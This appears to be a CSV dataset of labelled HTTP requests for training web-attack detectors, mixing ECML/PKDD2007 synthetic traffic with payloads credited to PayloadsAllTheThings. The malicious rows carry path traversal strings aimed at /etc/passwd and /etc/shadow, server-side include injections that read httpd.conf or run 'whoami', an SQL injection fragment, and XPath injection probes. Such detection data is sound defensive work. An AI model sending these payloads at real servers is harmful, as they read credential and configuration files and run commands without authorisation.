attack_type,difficulty_bucket,difficulty_score,label,raw_request,request_id,request_len,sample_id,source_dataset,source_payload
SSI,medium,4.0,malicious,"PUT /fnte6oo0r/ogRqESCg/lvehhlzusee.mspx? HTTP/1.0
Content-Length: 213
Content-Language: ssOrht,sn1ettVh,tubl7
Content-Encoding: identity
Content-Location: /onro/fnecedr/4snNii4/5anp.dll
Content-MD5: eWV0bGVhR29zY2V0Tk1OZQ==
Content-Type: application/x-www-form-urlencoded
Expires: Tue, 21 Nov 06 23:15:18 GMT
Last-Modified: Fri, 18 Feb 05 19:22:42 UTC
Host: www.hliga.st
Connection: hnrsa
Accept: */*
Accept-Charset: windows-1251;q=0.0, iso-8859-4;q=0.1, x-mac-cyrillic;q=0.5, iso-8859-4, utf-7;q=0.3
Accept-Encoding: 
Accept-Language: *;q=0.4
Cache-Control: agbnne4='rzigaI'
Client-ip: 145.102.168.110
Cookie: dsai=n;lymt=iAeea;riPoeraOH9891na=ygwnMzZi;CmetaADn@=dmi otanaA0ps;nph-_nQd8ooa=582046
Cookie2: $Version=""0""
Date: Tue, 06 Oct 09 17:04:10 UTC
ETag: ""E-DjyT8l5_1VDtzNt-o""
Expect: t7ug=t2ana;oee3=fmtY
If-Modified-Since: Sat, 30 Jun 07 04:17:02 UTC
If-Unmodified-Since: Sat, 10 Oct 09 11:28:42 CET
If-Match: ""60iTwuKyZWjIevA""
If-None-Match: *
Max-Forwards: 739
Pragma: no-cache
Authorization: NTLM a2RkZHVoZ2V0RWF0ZWhpN25jaXV0c280aUVvZ29wbDJvaW50bGdMYWtlcW9u
Referer: /epl6/maau.mspx
TE: trailers,gzip;q=0.4
User-Agent: rEn3oNm_ http://www.rkqotdF.org
UA-CPU: x86
UA-OS: Windows 98
Via: 1.4 147.201.129.5, 6.7 42.203.74.130, FTP/6.8 www.coGgsodh.htm
Transfer-Encoding: compress
----: -------------------------------------------------
~~~~~: ~~~~~~~~~~~~~~~~

nqlLNng=2ofb/&reeoenO=<!--     #include    virtual=""/etc/httpd/httpd.conf""-->&eBfntgYIodecp=ddNot6dQ&r8cun8od=ancgnsfo7a1st&y0biaeewfoitatn=eloWdcn1io&w3eenssvr=q&ondwisOdcwwwo=mo3s&ndtsz=848",39577,1599,xml_test-39577,ECML/PKDD2007,
Path Traversal,medium,,malicious,"GET /search?q=/../../../../../../../../../../etc/passwd HTTP/1.1
Host: demo.local
User-Agent: python-requests/2.31
Accept: */*
Connection: close",,148,patt-path-traversal-1005,PayloadsAllTheThings,/../../../../../../../../../../etc/passwd
Path Traversal,medium,,malicious,"POST /comments HTTP/1.1
Host: demo.local
User-Agent: curl/8.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 58
Connection: close

search=/../../../../../../../../../../etc/shadow^^&id=2176",,215,patt-path-traversal-1176,PayloadsAllTheThings,/../../../../../../../../../../etc/shadow^^
SSI,medium,,malicious,"POST /profile HTTP/1.1
Host: intranet.local
User-Agent: curl/8.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 41
Connection: close

search=<!--#exec cmd=""whoami"" -->&id=1612",,201,patt-ssi-0612,PayloadsAllTheThings,"<!--#exec cmd=""whoami"" -->"
,hard,-2.0,benign,"GET /n0mEoiFta/g@4ivoyKxp_Ao/oS2v8@.Q9/5kperlT7VAR.php3? HTTP/1.0
Host: 152.110.75.106
Connection: close
Accept: */*
Accept-Charset: *
Accept-Encoding: 
Accept-Language: saopon7-ts;q=0.8
Cache-Control: Eott='nt'
Client-ip: 1.126.250.57
Cookie: Ethd=w3brcie3
Cookie2: $Version=""740""
Date: Sat, 20 Mar 04 23:36:35 CET
ETag: W/""rpsSZWkJNUkV0RD9""
Expect: 100-continue
From: hemanaoa@nrqynnnt.uk
If-Modified-Since: Mon, 29 Oct 07 14:26:09 GMT
If-Unmodified-Since: Sun, 23 Dec 07 07:35:29 CET
If-Match: *
If-None-Match: "".8OJTPD4dZU5BUYUcln""
If-Range: Mon, 12 Oct 09 02:53:55 UTC
Max-Forwards: 490
MIME-Version: 9.4
Pragma: no-cache
Proxy-Authorization: NTLM OGlndWVmdW5aZGZpbzRnZG5wbGlxYnJjYW5hbGFlc25pNXRy
Authorization: Basic YXJhZDpvZm5laGg3YQ==
Range: 75-,670-452322
Referer: http://sytw.uk/htygu9di/netwem.avi
TE: trailers
Trailer: TE
User-Agent: t0wehRysjbe2qhos6
UA-CPU: StrongARM
UA-Disp: 4712,7583,16
UA-OS: Windows 98
UA-Color: color8
UA-Pixels: 065x683
Via: 8.1 165.193.248.83, 9.6 176.168.39.193:60758, 0.4 112.61.19.189
Transfer-Encoding: gzip
Upgrade: taal/5.1, qooc/0.7
Warning: 463 38.25.235.94 ""nanvauebu"" 
X-Forwarded-For: 76.40.16.131
X-Serial-Number: 7835814731
----: --------------------
~~~~~: ~~~~~~~~~~~~~~",15361,1267,xml_test-15361,ECML/PKDD2007,
,hard,-2.0,benign,"GET /8r3npeeag8S3rwiex.html?gseai=s&sh9hi7wquah5l=9570491&7feoaulohtKOs=1&pnehicetfra=eD8W%40C&0execTR6opttj=ka6ossarp&aieebst=+ah&dhusa=185301&han5rshhne=su&wrubectRts=40273206&inpreohteaNo=19198059&7o=dn%3Epa&sEn6bd8ynbns7b=i8b HTTP/1.1
Host: www.tKer.fr:80
Connection: keep-alive
Accept: text/xml
Accept-Charset: gb2312;q=0.5, iso-8859-8;q=0.4, x-mac-roman;q=0.1, x-mac-ce;q=0.1, iso-2022-kr
Accept-Encoding: identity, deflate, compress, identity;q=0.1, identity
Accept-Language: nr-tsNmFo;q=0.4, pbgrmeyA-A7Aee1rS;q=0.8, 0ptns0-wdni;q=0.1
Cache-Control: no-transform
Client-ip: 91.224.33.57
Cookie: rrnhyeoidaeg=ttsesuo;wG4telnettQbgBandevalE=iframer IS;gnaaicr=386745;dtNrtoS8ieoy5nT=36;V7MqIzB@@=lr;tbbvhalt=374743
Cookie2: $Version=""69""
Date: Sun, 25 Jul 04 20:14:15 CET
ETag: W/""Olimrl8N8EDcthct""
Expect: 100-continue
From: ctaMmsso@ernuTGi.biz
If-Modified-Since: Wed, 09 Feb 05 22:11:48 UTC
If-Unmodified-Since: Mon, 25 Aug 08 02:01:16 UTC
If-Match: *
If-None-Match: ""5mpkYTh8.xw9gMyaVI""
If-Range: Sun, 21 Jan 07 07:44:31 CET
Max-Forwards: 57
MIME-Version: 9.1
Pragma: no-cache
Proxy-Authorization: Digest qop=fe4a
Authorization: Digest username=""1rmyafy""
Range: -8237
Referer: /ahir/lf6d/aetlh4c/3ezrroyd.exe
TE: trailers
Trailer: Accept-Charset
User-Agent: Mozilla/9.6 (Machintosh; U; Mac OS X 4.0; Ed-ta; rv:6.1.0) Gecko/85907531
UA-CPU: MIPS
UA-Disp: 419,947,16
UA-OS: Win9x
UA-Color: color32
UA-Pixels: 0794x264
Via: xb9/8.6 34.123.255.167
Transfer-Encoding: identity
Upgrade: Oseec/1.0, nnnre/5.8, Erl/6.8, enun9n/4.2
Warning: 136 255.90.245.205 ""aYBe5ugoa7It7"" 
X-Forwarded-For: 177.251.149.163
X-Serial-Number: 688483710117371
----: -------------------------------------
~~~~~: ~~~~~~~~~~~~~",9135,1750,xml_test-9135,ECML/PKDD2007,
SQLi,medium,3.0,malicious,"GET /bpzcuTinclude/o3DzR/1p.Z5Wfjbu8yl/ehdiao/mB8xH.gif? HTTP/1.0
Host: www.riui7doez.fr
Connection: close
Accept: */*;q=0.9
Accept-Charset: iso-2022-jp, iso-8859-1, us-ascii
Accept-Encoding: *;q=0.6
Accept-Language: OrigText'OR'aiecxh'=  '4aa'
Cache-Control: max-age=36143
Client-ip: 94.242.254.161
Cookie: elenoesrdaentt=shfte0titie6co
Cookie2: $Version=""21""
Date: Tue, 22 Jul 08 08:35:50 CET
ETag: ""rCPRKGsYtiLX5mGhQUHw""
Expect: ceo9ee=xhIpcme;toatouM=3tone
From: mecty@ntysdF.de
If-Modified-Since: Thu, 10 Dec 09 21:59:11 UTC
If-Unmodified-Since: Fri, 01 Jul 05 19:48:38 CET
If-Match: *
If-None-Match: ""ElBCQ8Lawoz48ph3.836""
If-Range: Mon, 14 Mar 05 21:47:03 CET
Max-Forwards: 4658
MIME-Version: 8.9
Pragma: cY2=tno
Proxy-Authorization: Basic dGxzUDpoZW92aQ==
Authorization: hsbtt Tmleeehe=EdeiNse
Range: -904358
Referer: http://www.roain.biz/3nijva/mHTyp/pste/bijiLTn.gif
TE: chunked;q=0.9,chunked;q=0.2,trailers
Trailer: Accept
User-Agent: hEdieegrhdt
UA-CPU: MIPS
UA-Pixels: 724x926
Via: FTP/3.0 www.2oi6.jpg, 5.4 www.oh6mn.gif, HTTP/8.0 110.136.244.77
Transfer-Encoding: gzip
Upgrade: delaks/6.4, u3ts/7.2, eriEl/2.3, mehun/9.8
Warning: 572 www.ettslzed.tiff ""ur5thincCbfLtamlyoaS"" ""Sun, 21 Jun 09 08:46:44 CET""
X-Forwarded-For: 112.176.54.6
X-Serial-Number: 800944
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~",41180,1345,xml_test-41180,ECML/PKDD2007,
XPath Injection,medium,,malicious,"POST /search HTTP/1.1
Host: demo.local
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 63
Connection: close

path=substring(//user[userid=5]/username,2,1)=CHAR_HERE&id=1331",,219,patt-xpath-injection-0331,PayloadsAllTheThings,"substring(//user[userid=5]/username,2,1)=CHAR_HERE"
Path Traversal,medium,,malicious,"POST /comments HTTP/1.1
Host: app.local
User-Agent: python-requests/2.31
Content-Type: application/x-www-form-urlencoded
Content-Length: 52
Connection: close

name=...\...\...\...\...\...\...\/etc/passwd&id=2043",,218,patt-path-traversal-1043,PayloadsAllTheThings,...\...\...\...\...\...\...\/etc/passwd
,hard,-2.0,benign,"GET /7NBf_dC-A8V4WTp4IZGy.sh?ErNaAf=eslghonsl&M7gldropO=ort9telnetAhwedejnle&tpitle=Ta&cna4oIh=sMC&afg=e8iucglgous&ee1adehenvy6=o9ahrekow7gAia&rczltjaoeane=f27G.xrZBvk&t5ebior=+nt%3Bidasd%3Cmpassthrue&DPvx.optA.KD8log=s%3E4Sa&nQJy=6268&oyt0isxfpncio=40&o59etfeuzZ0bchn=TbyndzgETdd&meHmw=dP3EHfFM%40F&fqeesetne9emn=9353 HTTP/1.0
Host: 173.148.74.131
Connection: enc4aee
Accept: text/html
Accept-Charset: *
Accept-Encoding: 
Accept-Language: *
Cache-Control: max-stale=3
Client-ip: 47.81.49.136
Cookie: Tr5ton=yasl
Cookie2: $Version=""0""
Date: Fri, 15 May 09 21:57:22 GMT
ETag: ""GTT_ruE5smtFKc9n2li""
Expect: Setn
From: s4et@ks7hmvs0.net
If-Modified-Since: Sun, 30 Jan 05 07:55:40 CET
If-Unmodified-Since: Fri, 23 Jan 04 13:31:59 UTC
If-Match: *
If-None-Match: *
If-Range: Thu, 11 Jun 09 24:03:37 UTC
Max-Forwards: 9
MIME-Version: 3.2
Pragma: eEr='30uyQg'
Proxy-Authorization: NTLM MmRvcnNyZnBlZWhtaG9yZWwyYWRkYmV3ZG5lZWEybjZyMzNreWJv
Authorization: Basic YXN0dGc6d3Blc2dlZQ==
Range: 744728-20044,-10
Referer: /vaifhsfn/ssnn9d/suyhbbow/buaaa/as99pima.js
TE: trailers,trailers,trailers
Trailer: Cache-Control
User-Agent: asei8o/6.5
UA-CPU: Sparc
UA-Disp: 581,250,16
UA-OS: Win98
UA-Color: color32
UA-Pixels: 1640x452
Via: 1.2 217.109.147.134
Transfer-Encoding: compress
Upgrade: nwio/9.0, n54lt8/8.5, iBdj/1.4, mosr/0.0, sgiit/9.8
Warning: 287 www.nmbeojUN.html ""ecnaenetwacJolFrOica"" ""Tue, 01 Dec 09 09:09:42 UTC""
X-Forwarded-For: 120.175.57.26
X-Serial-Number: 7123081582615631
----: ----------------------------------
~~~~~: ~~~~~~~~~~~~~~~~",2333,1581,xml_test-2333,ECML/PKDD2007,
,hard,-2.0,benign,"GET /Gk/ehe.js?epO=R%40group+byaccess_log%29yle&ar5n=wucmdxoy-&v7Do=10&atmpsr@lpWXadmin6=lt%251nCBcrHeawn&72=9&ellcise7ifuumte=-eUinserts0dfc&aapnq3peg3a7i=rsU&roliqastavhnaR=5&eo=h25T7r&se6=ivrho&ihorsoeiAerlist=stylelEoyz%7C6a&lstsaan=3823&odozdDf=85194295&au=e HTTP/1.0
Host: 81.127.178.30
Connection: close
Accept: */*;q=0.5
Accept-Charset: cp-950;q=0.5, x-mac-arabic;q=0.8
Accept-Encoding: 
Accept-Language: hvTirxN8-ifehDe;q=0.8, e2e-l, s4it-ieeoDn, d-ohdsee;q=0.8, oxsbta8-Hyevaa;q=0.8
Cache-Control: max-age=0426
Client-ip: 226.179.232.156
Cookie: im37nTalbr5rf9=|toeen2W8wr;telnetzidHs=8126
Cookie2: $Version=""291""
Date: Wed, 13 Feb 08 09:04:36 CET
ETag: W/""U5triMCzA1VMbPUS""
Expect: eeo8gl
From: tamegP8@NaDasMP.be
If-Modified-Since: Thu, 20 Mar 08 06:51:31 CET
If-Unmodified-Since: Sat, 16 Jun 07 21:51:34 GMT
If-Match: *
If-None-Match: *
If-Range: *
Max-Forwards: 902
MIME-Version: 5.5
Pragma: no-cache
Proxy-Authorization: Digest uri=http://28yon.org/iij6lh/pkbw3gd/AoND/aehai/s4tirli.gif
Authorization: Digest realm
Range: 4696-5,-34840
Referer: http://dadmhbYe.de/t0rez/apUntsi/hjro/uto7n6ty/eouw.cgi
TE: trailers,chunked;q=0.6,chunked
Trailer: Expect
User-Agent: sselrl2to (2t_E4u; qA32MYb8; rGWZ54CwG; axPU8I0mM)
UA-CPU: MIPS
UA-Disp: 9434,874,32
UA-OS: Mac OS X
UA-Color: color32
UA-Pixels: 6216x6265
Via: 8.4 78.50.39.217, etby/2.6 www.cdedrGb.gif, HTTP/6.8 140.145.228.143
Transfer-Encoding: mmeyiH; mekliyFe=U0eufns
Upgrade: txsikk/4.1, hnh/1.7, bte/4.1, eAsee/7.7, Ei7rcc/1.1
Warning: 649 www.3snl9.jpg:7772 ""cetphelatiyt"" 
X-Forwarded-For: 5.120.156.102
X-Serial-Number: 8769415
----: --------------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~",22593,1728,xml_test-22593,ECML/PKDD2007,
Path Traversal,medium,,malicious,"POST /api/items HTTP/1.1
Host: intranet.local
User-Agent: curl/8.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 58
Connection: close

redirect=./\/././\/././\/././\/././\/.//etc/passwd&id=2053",,220,patt-path-traversal-1053,PayloadsAllTheThings,./\/././\/././\/././\/././\/.//etc/passwd
XPath Injection,medium,,malicious,"POST /download HTTP/1.1
Host: app.local
User-Agent: python-requests/2.31
Content-Type: application/x-www-form-urlencoded
Content-Length: 51
Connection: close

search=' and count(/comment())=1 and '1'='1&id=1493",,217,patt-xpath-injection-0493,PayloadsAllTheThings,' and count(/comment())=1 and '1'='1
